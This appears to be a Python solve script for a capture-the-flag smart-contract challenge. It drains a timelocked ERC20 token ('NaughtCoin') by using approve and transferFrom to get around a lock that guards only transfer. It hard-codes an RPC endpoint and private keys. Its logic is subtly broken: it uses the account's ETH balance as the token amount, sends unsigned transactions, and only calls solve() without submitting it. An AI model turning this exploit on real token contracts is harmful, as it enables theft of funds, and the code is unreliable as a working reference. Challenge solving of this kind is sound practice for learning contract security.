from web3 import Web3
from eth_account import Account
from solcx import compile_source, install_solc, set_solc_version
from pwn import *

install_solc("0.8.21")
set_solc_version("0.8.21")



RPC = "http://161.97.155.116:8545/kdpknHrKurSsslhDBTzyvPKP/main"
PK  = "0xdd0d6fe3bac541f4864319db49ed7c9423ba46c68a00f584a0794ff391359eb9"

w3 = Web3(Web3.HTTPProvider(RPC))
CHALL_ADDR = w3.to_checksum_address("0x5832c48A0A559eAb5AB102a99dDbd6EcD69746ec")
acct = Account.from_key(PK)
acct2 = Account.from_key("0x129e3e3755469dc8863791461cb362b5cf6815b2629e918048675c74c1f14cd5")

player_address = acct.address
recipient_address = acct2.address
balance = w3.eth.get_balance(player_address)

print("Connected:", w3.is_connected())
print("Your address:", acct.address)
print("Chain ID:", w3.eth.chain_id)
print("Latest block:", w3.eth.block_number)


challenge_source = """
pragma solidity ^0.8.0;

import "Timelock.sol";

contract Challenge {
    address public immutable PLAYER;
    Timelock public immutable CONTRACT;

    bool private solved;

    constructor(address player, address _contract) public {
        PLAYER = player;
        
        CONTRACT = Timelock(payable(_contract));
    }

    function solve() external {
        require(CONTRACT.balanceOf(PLAYER) == 0, "COINS_NOT_SPENT");
        solved = true;
    }

    function isSolved() external view returns (bool) {
        return solved;
    }
}
"""

timelock_source = """
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "node_modules/@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract Timelock is ERC20 {
    uint256 public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) ERC20("NaughtCoin", "0x0") {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
        _mint(player, INITIAL_SUPPLY);
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    }

    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
        super.transfer(_to, _value);
    }

    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock);
            _;
        }
    }
}
"""

challenge_compile = compile_source(challenge_source, output_values=["abi", "bin"])
timelock_compile = compile_source(timelock_source, output_values=["abi", "bin"])
challenge_id, challenge_interface = next(iter(challenge_compile.items()))
timelock_id, timelock_interface = next(iter(timelock_compile.items()))

challenge_abi = challenge_interface["abi"]
timelock_abi = timelock_interface["abi"]


chall = w3.eth.contract(address=CHALL_ADDR, abi=challenge_abi)
timelock = w3.eth.contract(address=w3.to_checksum_address(chall.functions.CONTRACT().call()), abi=timelock_abi)

print(chall.functions.CONTRACT().call())
print(timelock.address)

timelock.functions.approve(player_address, balance).transact({'from': player_address})

# Player calls transferFrom directly
timelock.functions.transferFrom(player_address, recipient_address, balance).transact({'from': player_address})

chall.functions.solve().call()
